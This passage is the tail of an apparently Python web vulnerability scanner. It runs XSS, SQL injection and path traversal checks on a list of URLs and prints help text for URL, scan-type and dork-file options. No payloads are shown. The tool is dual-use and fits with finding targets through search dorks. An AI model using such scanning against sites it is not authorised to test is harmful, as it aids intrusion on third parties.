        scanner.main_xss(urls_to_scan)
        scanner.main_sql(urls_to_scan)
        scanner.main_traversal(urls_to_scan)

    else :
        
        print(f"""
{Fore.WHITE}Help:
{Fore.WHITE}-----------------------------------------------------------------------------------
{Fore.YELLOW}-u {Fore.WHITE}/ {Fore.YELLOW}--url  \t{Fore.WHITE}| {Fore.YELLOW}Specify a website to check               {Fore.WHITE}| ...
{Fore.YELLOW}-t {Fore.WHITE}/ {Fore.YELLOW}--type \t{Fore.WHITE}| {Fore.YELLOW}Choose the scan type                     {Fore.WHITE}| {Fore.YELLOW}SQL {Fore.WHITE}- {Fore.YELLOW}XSS {Fore.WHITE}- {Fore.YELLOW}PATH {Fore.WHITE}- {Fore.YELLOW}ALL
{Fore.YELLOW}-d {Fore.WHITE}/ {Fore.YELLOW}--dork \t{Fore.WHITE}| {Fore.YELLOW}Specify a dorks file                     {Fore.WHITE}| ...
""")